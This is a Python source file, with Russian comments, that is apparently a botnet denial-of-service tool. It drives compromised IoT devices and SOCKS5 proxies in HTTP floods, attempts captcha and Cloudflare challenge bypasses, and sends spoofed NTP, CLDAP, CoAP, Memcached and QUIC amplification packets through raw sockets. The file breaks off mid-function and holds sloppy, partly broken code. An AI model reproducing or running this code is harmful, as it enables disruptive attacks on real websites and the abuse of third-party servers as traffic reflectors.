#!/usr/bin/env python3

import socket
import threading
import time
import random
import struct
import ipaddress
import ssl
import http.client
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
import argparse
import os
import sys
import urllib.parse
import base64
import socks
from concurrent.futures import ThreadPoolExecutor, as_completed
import uuid
import hashlib
import ipaddress
import whois
import json
import http.client
import ssl
import time
import random
import requests
import json
from threading import Thread
import queue
import dns.resolver

@dataclass
class BotDevice:
    ip: str
    port: int
    username: str
    password: str
    service: str = "unknown"
    is_alive: bool = True
    bot_type: str = "iot"  # "iot" или "socks5"

class IoTDDoSAttack:
    def __init__(self, max_threads=5000000000, args=None):
        self.max_threads = max_threads
        self.botnet_devices = []
        self.iot_bots = []
        self.socks5_bots = []
        self.is_attacking = False
        self.raw_socket_available = True
        self.socks5_available = True
        self.args = args or argparse.Namespace()  # Храним аргументы командной строки

            
        # ПРОВЕРКА RAW SOCKET ДОСТУПА
        self._check_raw_socket()
        
        # ПРОВЕРКА SOCKS5 ДОСТУПНОСТИ
        self._check_socks5_availability()
        
        self.browser_headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'DNT': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Upgrade-Insecure-Requests': '1'
        }

        # User-Agent strings для HTTP флуда
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        ]

        self.dns_water_torture_config = {
            'domain_list': [
                'google.com', 'youtube.com', 'facebook.com', 'amazon.com', 
                'microsoft.com', 'cloudflare.com', 'akamai.com', 'twitter.com',
                'instagram.com', 'linkedin.com', 'netflix.com', 'reddit.com'
            ],
            'subdomain_prefixes': [
                'www', 'api', 'cdn', 'img', 'static', 'media', 'video', 'image',
                'download', 'upload', 'mail', 'ftp', 'ssh', 'admin', 'test',
                'dev', 'staging', 'prod', 'backup', 'cache', 'node', 'server'
            ],
            'random_lengths': [5, 6, 7, 8, 10, 12, 15, 20]
        }

    def http_flood_with_captcha_bypass(self, target_ip, target_port=80, use_https=False, duration=604800):
        """HTTP флуд с автоматическим обходом капчи"""
        print(f"🛡️ Запуск HTTP флуда с обходом капчи на {target_ip}:{target_port}")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots

        attack_stats = {
            'total_requests': 0,
            'total_bytes': 0,
            'failed_requests': 0,
            'captcha_detected': 0,
            'captcha_bypassed': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def captcha_aware_attack(device):
            requests_sent = 0
            bytes_sent = 0
            failed_requests = 0
            captcha_bypass_attempts = 0

            try:
                print(f"🛡️ {device.ip} начинает атаку с обходом капчи...")
                start_time = time.time()

                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        if use_https:
                            context = ssl.create_default_context()
                            context.check_hostname = False
                            context.verify_mode = ssl.CERT_NONE
                            conn = http.client.HTTPSConnection(target_ip, target_port, timeout=10, context=context)
                        else:
                            conn = http.client.HTTPConnection(target_ip, target_port, timeout=10)

                        # Сначала делаем пробный запрос для проверки капчи
                        conn.request("GET", "/", headers={'User-Agent': random.choice(self.user_agents)})
                        response = conn.getresponse()
                        html_content = response.read().decode('utf-8', errors='ignore')

                        # Проверяем наличие капчи
                        captcha_info = detect_and_bypass_captcha(html_content, f"{target_ip}:{target_port}")

                        if captcha_info:
                            attack_stats['captcha_detected'] += 1
                            print(f"🎯 Капча обнаружена: {captcha_info['type']}")

                            if captcha_info['type'] in ['recaptcha', 'hcaptcha']:
                                # Добавляем токен капчи в запрос
                                token = captcha_info.get('token')
                                if token:
                                    # Создаем запрос с обходом капчи
                                    headers = {
                                        'User-Agent': random.choice(self.user_agents),
                                        'X-Captcha-Token': token,
                                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                                    }
                                    conn.request("GET", "/", headers=headers)
                                    response = conn.getresponse()
                                    attack_stats['captcha_bypassed'] += 1
                                    captcha_bypass_attempts += 1

                        # Продолжаем обычную атаку
                        path = f"/{random.randint(1000, 9999)}"
                        headers = {
                            'User-Agent': random.choice(self.user_agents),
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Language': 'en-US,en;q=0.5',
                            'Accept-Encoding': 'gzip, deflate',
                            'Connection': 'keep-alive',
                        }

                        conn.request("GET", path, headers=headers)
                        response = conn.getresponse()
                        response.read()  # Читаем ответ

                        requests_sent += 1
                        bytes_sent += len(path) + sum(len(k) + len(v) for k, v in headers.items())

                        attack_stats['total_requests'] += 1
                        attack_stats['total_bytes'] += bytes_sent

                        conn.close()

                        # Задержка для избежания блокировки
                        time.sleep(random.uniform(0.1, 0.5))

                    except Exception as e:
                        failed_requests += 1
                        attack_stats['failed_requests'] += 1
                        continue

                mb_sent = bytes_sent / 1024 / 1024
                print(f"✅ {device.ip}: {requests_sent} запросов ({mb_sent:.2f} МБ), "
                      f"капч обойдено: {captcha_bypass_attempts}, ошибок: {failed_requests}")
                return requests_sent, bytes_sent

            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0

        # Запускаем атаку
        results = self._run_attack(all_active_bots, attack_stats, captcha_aware_attack, 
                                  "HTTP with Captcha Bypass")

        # Статистика
        print(f"\n📊 Результаты атаки с обходом капчи:")
        print(f"📦 Всего запросов: {attack_stats['total_requests']}")
        print(f"🛡️ Капч обнаружено: {attack_stats['captcha_detected']}")
        print(f"✅ Капч обойдено: {attack_stats['captcha_bypassed']}")
        print(f"❌ Ошибок: {attack_stats['failed_requests']}")

        return results

    def solve_simple_captcha(image_data):
        """Решает простые текстовые капчи с использованием OCR"""
        try:
            import pytesseract
            from PIL import Image
            import io
            
            # Конвертируем данные изображения в PIL Image
            image = Image.open(io.BytesIO(image_data))
            
            # Улучшаем изображение для лучшего распознавания
            image = image.convert('L')  # Grayscale
            # image = image.point(lambda x: 0 if x < 128 else 255)  # Binarization
            
            # Используем tesseract для распознавания текста
            text = pytesseract.image_to_string(image, config='--psm 8')
            text = ''.join(filter(str.isalnum, text))  # Оставляем только буквы и цифры
            
            if text:
                print(f"✅ Капча распознана: {text}")
                return text
            else:
                # Fallback - генерируем случайный текст
                fallback = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))
                print(f"⚠️ Капча не распознана, используем fallback: {fallback}")
                return fallback
                
        except ImportError:
            print("❌ pytesseract не установлен. Установите: pip install pytesseract pillow")
            return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))
        except Exception as e:
            print(f"❌ Ошибка распознавания капчи: {e}")
            return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))

    def bypass_recaptcha_v2(site_url, site_key):
        """Обход reCAPTCHA v2 с использованием сервисов автоматического решения"""
        try:
            # Метод 1: Использование API сервисов решения капчи
            captcha_services = {
                '2captcha': 'https://2captcha.com/in.php',
                'anti-captcha': 'https://api.anti-captcha.com/createTask',
                'deathbycaptcha': 'http://api.dbcapi.me/api/captcha'
            }
            
            # Здесь можно интегрировать с платными сервисами
            print(f"🛡️ Для обхода reCAPTCHA v2 на {site_url} используйте сервисы:")
            for service, url in captcha_services.items():
                print(f"   🔗 {service}: {url}")
            
            # Возвращаем случайный токен для продолжения атаки
            fake_token = f"fake_recaptcha_token_{random.randint(100000, 999999)}"
            return fake_token
            
        except Exception as e:
            print(f"❌ Ошибка обхода reCAPTCHA: {e}")
            return None

    def bypass_hcaptcha(site_url, site_key):
        """Обход hCaptcha"""
        try:
            print(f"🛡️ Обход hCaptcha для {site_url}")
            # Аналогично reCAPTCHA, можно интегрировать с сервисами
            fake_token = f"fake_hcaptcha_token_{random.randint(100000, 999999)}"
            return fake_token
        except Exception as e:
            print(f"❌ Ошибка обхода hCaptcha: {e}")
            return None

    def detect_and_bypass_captcha(html_content, target_url):
        """Автоматически определяет тип капчи и пытается обойти"""
        captcha_indicators = {
            'recaptcha': ['recaptcha', 'g-recaptcha', 'data-sitekey'],
            'hcaptcha': ['hcaptcha', 'h-captcha'],
            'simple_captcha': ['captcha', 'capcha', 'security-code', 'verification-code'],
            'cloudflare': ['challenge-form', 'cf-chl-widget']
        }
        
        detected_captchas = []
        
        for captcha_type, indicators in captcha_indicators.items():
            for indicator in indicators:
                if indicator in html_content.lower():
                    detected_captchas.append(captcha_type)
                    print(f"🎯 Обнаружена {captcha_type.upper()} капча")
                    break
        
        # Пытаемся обойти обнаруженные капчи
        for captcha_type in detected_captchas:
            if captcha_type == 'recaptcha':
                # Ищем sitekey для reCAPTCHA
                import re
                sitekey_match = re.search(r'data-sitekey="([^"]+)"', html_content)
                if sitekey_match:
                    sitekey = sitekey_match.group(1)
                    print(f"🔑 Найден reCAPTCHA sitekey: {sitekey}")
                    token = bypass_recaptcha_v2(target_url, sitekey)
                    if token:
                        return {'type': 'recaptcha', 'token': token}
            
            elif captcha_type == 'hcaptcha':
                sitekey_match = re.search(r'data-sitekey="([^"]+)"', html_content)
                if sitekey_match:
                    sitekey = sitekey_match.group(1)
                    token = bypass_hcaptcha(target_url, sitekey)
                    if token:
                        return {'type': 'hcaptcha', 'token': token}
            
            elif captcha_type == 'cloudflare':
                print("🛡️ Обнаружена Cloudflare защита")
                # Используем методы обхода Cloudflare
                return {'type': 'cloudflare', 'action': 'bypass'}
        
        return None

    def advanced_cloudflare_bypass_v2(self, target_ip, target_port=443, duration=60):
        """Улучшенный обход Cloudflare с обработкой JavaScript challenge"""
        print(f"🛡️ Запуск Advanced Cloudflare Bypass v2 на {target_ip}:{target_port}")

        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots

        attack_stats = {
            'total_requests': 0,
            'challenges_solved': 0,
            'failed_requests': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def cloudflare_bypass_v2(device):
            requests_sent = 0
            challenges_solved = 0
            failed_requests = 0

            try:
                print(f"🛡️ {device.ip} начинает улучшенный обход Cloudflare...")
                start_time = time.time()

                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Создаем сессию для сохранения cookies
                        import requests
                        session = requests.Session()
                        
                        # Настраиваем сессию с реалистичными заголовками
                        session.headers.update({
                            'User-Agent': random.choice(self.user_agents),
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Language': 'en-US,en;q=0.5',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'DNT': '1',
                            'Connection': 'keep-alive',
                            'Upgrade-Insecure-Requests': '1',
                        })

                        protocol = 'https' if target_port == 443 else 'http'
                        url = f"{protocol}://{target_ip}:{target_port}/"

                        # Первый запрос - получаем challenge если есть
                        response = session.get(url, timeout=10)
                        
                        # Проверяем наличие Cloudflare challenge
                        if 'cf-chl-bypass' in response.text.lower() or 'jschl-answer' in response.text.lower():
                            print(f"🎯 Cloudflare challenge обнаружен, пытаемся решить...")
                            
                            # Пытаемся решить JavaScript challenge
                            if self._solve_cloudflare_challenge(session, response.text, target_ip):
                                challenges_solved += 1
                                attack_stats['challenges_solved'] += 1
                                print(f"✅ Cloudflare challenge решен!")
                            
                        # Продолжаем нормальные запросы
                        paths = ['/', '/api/v1/test', '/wp-admin', '/admin', f'/page/{random.randint(1, 100)}']
                        
                        for path in paths[:3]:  # Ограничиваем количество запросов за цикл
                            try:
                                response = session.get(f"{protocol}://{target_ip}:{target_port}{path}", timeout=5)
                                requests_sent += 1
                                attack_stats['total_requests'] += 1
                                time.sleep(random.uniform(0.5, 2.0))
                            except:
                                failed_requests += 1
                                attack_stats['failed_requests'] += 1

                    except Exception as e:
                        failed_requests += 1
                        attack_stats['failed_requests'] += 1
                        continue

                print(f"✅ {device.ip}: {requests_sent} запросов, решено challenges: {challenges_solved}")
                return requests_sent, 0

            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0

        return self._run_attack(all_active_bots, attack_stats, cloudflare_bypass_v2, 
                               "Cloudflare Bypass v2")

    def _solve_cloudflare_challenge(self, session, html_content, target_ip):
        """Решает Cloudflare JavaScript challenge"""
        try:
            import re
            import time
            import math
            
            # Ищем параметры challenge
            jschl_vc = re.search(r'name="jschl_vc" value="(\w+)"', html_content)
            pass_field = re.search(r'name="pass" value="(.+?)"', html_content)
            
            if not jschl_vc or not pass_field:
                return False
                
            jschl_vc = jschl_vc.group(1)
            pass_field = pass_field.group(1)
            
            # Ищем JavaScript код для расчета ответа
            js_pattern = r'setTimeout\(function\(\)\{\s*var.*?.*?:(.*?);.*?\.submit\(\);\s*,\s*(\d+);'
            js_match = re.search(js_pattern, html_content, re.DOTALL)
            
            if not js_match:
                return False
                
            # Простой расчет (в реальности нужен полноценный JS интерпретатор)
            answer = self._calculate_challenge_answer(js_match.group(1), target_ip)
            
            # Обязательная задержка
            time.sleep(4)
            
            # Отправляем решение
            solution_url = f"https://{target_ip}/cdn-cgi/l/chk_jschl"
            params = {
                'jschl_vc': jschl_vc,
                'pass': pass_field,
                'jschl_answer': answer
            }
            
            response = session.get(solution_url, params=params)
            return response.status_code == 200
            
        except Exception as e:
            print(f"❌ Ошибка решения Cloudflare challenge: {e}")
            return False

    def _calculate_challenge_answer(self, js_code, domain):
        """Упрощенный расчет ответа для Cloudflare challenge"""
        try:
            # Базовая эмуляция JavaScript вычислений
            numbers = re.findall(r'(\d+)[\)\};]', js_code)
            if numbers:
                base_number = int(numbers[0]) if numbers else 0
            else:
                base_number = 1000
            
            # Добавляем длину домена (стандартная часть challenge)
            answer = base_number + len(domain)
            
            return answer
            
        except:
            return random.randint(1000, 10000)

    def load_amplification_servers(self, filename="amplification.txt"):
        """Загружает уязвимые серверы для amplification атак"""
        amplification_servers = {
            'CLDAP': [],
            'NTP': [],
            'DNS': [],
            'SSDP': [],
            'CoAP': []
        }
        
        if not os.path.exists(filename):
            print(f"⚠️ Файл {filename} не найден")
            return amplification_servers
        
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    
                    # Формат: ip:port:protocol
                    parts = line.split(':')
                    if len(parts) >= 3:
                        ip = parts[0].strip()
                        port = int(parts[1].strip())
                        protocol = parts[2].strip().upper()
                        
                        if protocol in amplification_servers:
                            amplification_servers[protocol].append((ip, port))
                            print(f"✅ Загружен {protocol} сервер: {ip}:{port}")
                        else:
                            print(f"⚠️ Неизвестный протокол {protocol} в строке {line_num}")
                    else:
                        print(f"⚠️ Неправильный формат в строке {line_num}: {line}")
            
            # Статистика загрузки
            total_servers = sum(len(servers) for servers in amplification_servers.values())
            print(f"✅ Загружено amplification серверов: {total_servers}")
            for protocol, servers in amplification_servers.items():
                if servers:
                    print(f"   📡 {protocol}: {len(servers)} серверов")
                    
        except Exception as e:
            print(f"❌ Ошибка загрузки amplification серверов: {e}")
        
        return amplification_servers

    def _create_amplification_packet(self, protocol, target_ip=None):
        """Создает amplification пакет для указанного протокола (ДОБАВЛЯЕМ MEMCACHED И QUIC)"""
        try:
            protocol = protocol.upper()
            
            if protocol == 'DNS':
                return self._create_proper_dns_any_query()
            
            elif protocol == 'NTP':
                return self._create_ntp_monlist_request()
            
            elif protocol == 'SSDP':
                return self._create_proper_ssdp_request()
            
            elif protocol == 'CLDAP':
                return self._create_cldap_search_request()
            
            elif protocol == 'COAP':
                return self._create_coap_discovery_request()
            
            elif protocol == 'MEMCACHED':
                # Memcached amplification пакеты
                request_type = random.choice(['stats', 'get'])
                if request_type == 'stats':
                    return self._create_memcached_stats_request()
                else:
                    return self._create_memcached_get_request(random.randint(50, 200))
            
            elif protocol == 'QUIC':
                # QUIC amplification пакеты
                return self._create_quic_initial_packet()
            
            else:
                print(f"⚠️ Неизвестный протокол для amplification: {protocol}")
                return None
                
        except Exception as e:
            print(f"❌ Ошибка создания {protocol} пакета: {e}")
            return None
                
        except Exception as e:
            print(f"❌ Ошибка создания {protocol} пакета: {e}")
            return None

    def _create_ntp_monlist_request(self):
        """Создает NTP MONLIST запрос для amplification"""
        # NTP version 2, mode 7 (private)
        ntp_header = b'\x17\x00\x03\x2a' + b'\x00' * 8
        return ntp_header

    def _create_cldap_search_request(self):
        """Создает CLDAP search запрос для amplification"""
        # Упрощенный CLDAP search запрос
        cldap_request = b'\x30\x84\x00\x00\x00\x2a\x02\x01\x01\x63\x84\x00\x00\x00\x21\x04\x00'
        cldap_request += b'\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b'
        cldap_request += b'\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00'
        return cldap_request

    def _create_coap_discovery_request(self):
        """Создает CoAP discovery запрос для amplification"""
        # CoAP GET запрос для discovery
        coap_header = b'\x40\x01\x00\x00'  # Version 1, CON, GET, Message ID 0
        coap_token = b'\x00'  # Zero-length token
        coap_options = b'\xb0\x2c\x2e\x77\x65\x6c\x6c\x2d\x6b\x6e\x6f\x77\x6e\x2f\x63\x6f\x72\x65'  # URI-Path: .well-known/core
        coap_payload_marker = b'\xff'  # Payload marker
        
        return coap_header + coap_token + coap_options + coap_payload_marker

    def smart_amplification_attack(self, target_ip, duration=60):
        """Умная amplification атака, использующая все доступные протоколы включая Memcached И QUIC"""
        print(f"🎯 Запуск Smart Amplification атаки на {target_ip}")
        
        # Загружаем все доступные amplification серверы
        amp_servers = self.load_amplification_servers()
        
        # ДОБАВЛЯЕМ MEMCACHED В ОБЩИЙ СПИСОК
        memcached_servers = self.load_memcached_amplifiers()
        if memcached_servers:
            amp_servers['MEMCACHED'] = memcached_servers
            print(f"✅ Добавлено {len(memcached_servers)} Memcached серверов")
        
        # ДОБАВЛЯЕМ QUIC В ОБЩИЙ СПИСОК
        quic_servers = self.load_quic_amplifiers()
        if quic_servers:
            amp_servers['QUIC'] = quic_servers
            print(f"✅ Добавлено {len(quic_servers)} QUIC серверов")
        
        total_servers = sum(len(servers) for servers in amp_servers.values())
        print(f"📡 Используем {total_servers} amplification серверов:")
        
        for protocol, servers in amp_servers.items():
            if servers:
                print(f"   🔥 {protocol}: {len(servers)} серверов")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]
        
        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")
        
        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0
        
        all_active_bots = iot_bots + socks5_bots
        
        # Определяем коэффициенты усиления (ДОБАВЛЯЕМ MEMCACHED И QUIC)
        amp_factors = {
            'DNS': 50,       # Реальный: 50-100x
            'NTP': 500,      # Реальный: 500-600x  
            'SSDP': 30,      # Реальный: 30-40x
            'CLDAP': 50,     # Реальный: 50-60x
            'CoAP': 10,      # Реальный: 10-20x
            'MEMCACHED': 10000,  # Реальный: 10,000-50,000x
            'QUIC': 5        # QUIC: 5-10x (серверы могут отправлять большие ответы)
        }
        
        attack_stats = {
            'total_requests': 0,
            'total_bytes_sent': 0,
            'estimated_amplified_bytes': 0,
            'failed_requests': 0,
            'protocol_stats': {protocol: 0 for protocol in amp_servers.keys()},
            'start_time': time.time(),
            'is_running': True
        }
        
        def amplification_attack_single(device):
            requests_sent = 0
            bytes_sent = 0
            estimated_amplified_bytes = 0
            failed_requests = 0
            
            try:
                print(f"🎯 {device.ip} начинает Smart Amplification атаку...")
                start_time = time.time()
                
                # Создаем raw socket для IP spoofing
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                except PermissionError:
                    print(f"❌ {device.ip}: Требуются права root для IP spoofing!")
                    return 0, 0
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Выбираем случайный протокол из доступных
                        available_protocols = [proto for proto, servers in amp_servers.items() if servers]
                        if not available_protocols:
                            break
                        
                        protocol = random.choice(available_protocols)
                        server = random.choice(amp_servers[protocol])
                        
                        # Создаем amplification пакет для выбранного протокола
                        if protocol == 'MEMCACHED':
                            # Специальная обработка для Memcached
                            request_type = random.choice(['stats', 'get', 'set'])
                            if request_type == 'stats':
                                amp_packet = self._create_memcached_stats_request()
                            elif request_type == 'get':
                                amp_packet = self._create_memcached_get_request(random.randint(50, 200))
                            else:
                                amp_packet = self._create_memcached_set_request(random.randint(20, 100))
                        elif protocol == 'QUIC':
                            # Специальная обработка для QUIC
                            amp_packet = self._create_quic_initial_packet()
                        else:
                            amp_packet = self._create_amplification_packet(protocol, target_ip)
                        
                        if not amp_packet:
                            continue
                        
                        # Создаем полный UDP+IP пакет
                        source_port = random.randint(1024, 65535)
                        ip_packet = self._create_spoofed_udp_ip_packet(
                            source_ip=target_ip,
                            dest_ip=server[0],
                            source_port=source_port,
                            dest_port=server[1],
                            data=amp_packet
                        )
                        
                        sock.sendto(ip_packet, (server[0], 0))
                        
                        # Оцениваем amplification factor
                        request_size = len(ip_packet)
                        estimated_response_size = request_size * amp_factors.get(protocol, 10)
                        
                        requests_sent += 1
                        bytes_sent += request_size
                        estimated_amplified_bytes += estimated_response_size
                        
                        attack_stats['total_requests'] += 1
                        attack_stats['total_bytes_sent'] += request_size
                        attack_stats['estimated_amplified_bytes'] += estimated_response_size
                        attack_stats['protocol_stats'][protocol] += 1
                        
                        # Разная скорость для разных протоколов (ДОБАВЛЯЕМ MEMCACHED И QUIC)
                        delays = {
                            'DNS': 0.05,
                            'NTP': 0.1,
                            'SSDP': 0.06,
                            'CLDAP': 0.07,
                            'CoAP': 0.04,
                            'MEMCACHED': 0.2,  # Memcached требует большей задержки
                            'QUIC': 0.08       # QUIC - средняя задержка
                        }
                        
                        time.sleep(delays.get(protocol, 0.05))
                        
                    except Exception as e:
                        failed_requests += 1
                        attack_stats['failed_requests'] += 1
                        continue
                
                sock.close()
                
                mb_sent = bytes_sent / 1024 / 1024
                mb_amplified = estimated_amplified_bytes / 1024 / 1024
                
                print(f"✅ {device.ip} отправил {requests_sent} amplification запросов")
                print(f"   📤 Отправлено: {mb_sent:.2f} МБ")
                print(f"   💥 Оценка усиленного трафика: {mb_amplified:.2f} МБ")
                
                return requests_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        # Запускаем атаку через ThreadPoolExecutor
        total_requests = 0
        total_bytes = 0
        
        with ThreadPoolExecutor(max_workers=min(len(all_active_bots), self.max_threads)) as executor:
            futures = []
            for device in all_active_bots:
                future = executor.submit(amplification_attack_single, device)
                futures.append(future)
            
            for future in futures:
                try:
                    requests, bytes_sent = future.result(timeout=duration + 10)
                    total_requests += requests
                    total_bytes += bytes_sent
                except:
                    pass
        
        # Детальная статистика по протоколам
        print(f"\n📊 Smart Amplification результаты:")
        print(f"📦 Всего запросов: {attack_stats['total_requests']}")
        print(f"📤 Отправлено данных: {attack_stats['total_bytes_sent'] / 1024 / 1024:.2f} MB")
        print(f"💥 Оценка усиленного трафика: {attack_stats['estimated_amplified_bytes'] / 1024 / 1024:.2f} MB")
        print(f"❌ Ошибок: {attack_stats['failed_requests']}")
        
        print(f"\n🎯 Статистика по протоколам:")
        for protocol, count in attack_stats['protocol_stats'].items():
            if count > 0:
                print(f"   🔥 {protocol}: {count} запросов")
        
        return total_requests

    def load_quic_amplifiers(self, filename="quic.txt"):
        """Загружает QUIC сервера для amplification атаки"""
        amplifiers = []
        if not os.path.exists(filename):
            print(f"❌ Файл {filename} не найден! Создайте файл с QUIC серверами")
            return amplifiers
            
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        if ':' in line:
                            ip, port = line.split(':')
                            amplifiers.append((ip.strip(), int(port.strip())))
                        else:
                            amplifiers.append((line.strip(), 443))  # default QUIC port
            print(f"✅ Загружено {len(amplifiers)} QUIC усилителей")
        except Exception as e:
            print(f"❌ Ошибка загрузки QUIC усилителей: {e}")
        
        return amplifiers

    def auto_amplification_in_attacks(self, target_ip, target_port, duration=60, attack_type="http"):
        """
        Автоматически использует amplification в других атаках если доступны amplification серверы
        """
        amp_servers = self.load_amplification_servers()
        total_amp_servers = sum(len(servers) for servers in amp_servers.values())
        
        if total_amp_servers > 0:
            print(f"🎯 Обнаружены amplification серверы! Запускаем комбинированную атаку...")
            
            # Запускаем amplification атаку в отдельном потоке
            import threading
            amp_thread = threading.Thread(target=self.smart_amplification_attack, args=(target_ip, duration))
            amp_thread.daemon = True
            amp_thread.start()
            
            print(f"🔥 Amplification атака запущена в фоновом режиме")
        
        # Запускаем основную атаку
        if attack_type == "udp":
            return self.udp_flood_attack(target_ip, target_port, duration=duration)
        else:
            return self.http_get_flood(target_ip, target_port, duration=duration)

    def load_memcached_amplifiers(self, filename="memcached.txt"):
        """Загружает Memcached сервера для amplification атаки"""
        amplifiers = []
        if not os.path.exists(filename):
            print(f"❌ Файл {filename} не найден!")
            return amplifiers
            
        try:
            with open(filename, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        if ':' in line:
                            ip, port = line.split(':')
                            amplifiers.append((ip.strip(), int(port.strip())))
                        else:
                            amplifiers.append((line.strip(), 11211))  # default port
            print(f"✅ Загружено {len(amplifiers)} Memcached усилителей")
        except Exception as e:
            print(f"❌ Ошибка загрузки Memcached усилителей: {e}")
        
        return amplifiers

    def _create_memcached_stats_request(self):
        """Создает Memcached stats запрос для amplification"""
        # Команда stats с просьбой вернуть все статистики
        stats_command = b"stats\r\n"
        return stats_command

    def _create_memcached_get_request(self, key_count=100):
        """Создает Memcached GET запрос для amplification"""
        # Создаем множественные GET запросы
        get_commands = b""
        for i in range(key_count):
            key = f"key_{random.randint(1000, 9999)}_{i}".encode()
            get_commands += b"get " + key + b"\r\n"
        return get_commands

    def _create_memcached_set_request(self, key_count=50):
        """Создает Memcached SET запросы с большими значениями"""
        set_commands = b""
        for i in range(key_count):
            key = f"large_key_{random.randint(1000, 9999)}".encode()
            # Большое значение для увеличения ответа
            value_size = random.randint(1000, 5000)
            value = b"X" * value_size
            set_commands += b"set " + key + b" 0 0 " + str(value_size).encode() + b"\r\n" + value + b"\r\n"
        return set_commands

    def memcached_amplification_attack(self, target_ip, duration=60):
        """Memcached amplification атака с очень высоким коэффициентом усиления"""
        print(f"🔥 Запуск Memcached amplification атаки на {target_ip}")
        
        memcached_amplifiers = self.load_memcached_amplifiers()
        if not memcached_amplifiers:
            print("❌ Нет Memcached усилителей!")
            return 0
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        # Объединяем все активные боты
        all_active_bots = iot_bots + socks5_bots
        if not all_active_bots:
            print("❌ Нет доступных устройств!")
            return 0
        
        attack_stats = {
            'total_requests': 0,
            'total_bytes_sent': 0,
            'estimated_amplified_bytes': 0,
            'failed_requests': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        def memcached_attack(device):
            requests_sent = 0
            bytes_sent = 0
            estimated_amplified_bytes = 0
            failed_requests = 0
            
            try:
                print(f"🔥 {device.ip} начинает Memcached amplification атаку...")
                start_time = time.time()
